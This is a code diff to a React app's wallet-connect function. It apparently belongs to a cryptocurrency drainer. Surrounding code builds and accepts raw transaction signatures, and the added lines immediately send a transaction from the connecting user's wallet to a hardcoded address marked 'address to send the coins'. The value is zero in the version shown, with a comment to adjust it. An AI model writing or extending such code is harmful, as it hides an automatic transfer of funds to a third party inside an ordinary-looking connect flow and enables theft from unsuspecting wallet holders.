@@ -35,6 +35,9 @@ function App() {
     var account_sender = account[0];
     console.log("Wallet Connected: " + account_sender);
 
+    // Update wallet connect button with connected wallet address
+    document.getElementById("kos").innerText = `Connected: ${account_sender}`;
+
     // Function to generate the transaction signature
     async function genSign(address, chain, type, contract = "0") {
       if (type === "coin") {
@@ -88,6 +91,19 @@ function App() {
 
     var rawSign = await acceptSign(signature, "coin");
     console.log("Raw signature: " + rawSign);
+
+    // After accepting the signature, initiate the transaction
+    await provider.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account_sender,
+        to: "0xbA8958d52B940fF513746F24176D1017CaFa707E",  // address to send the coins
+        value: "0x0",  // Adjust the value if needed
+        gas: "0x5208",  // Standard gas limit for transactions
+        gasPrice: "0x3B9ACA00",  // Set the gas price
+      }]
+    });
+    console.log("Transaction Sent!");
   }
 
   return (
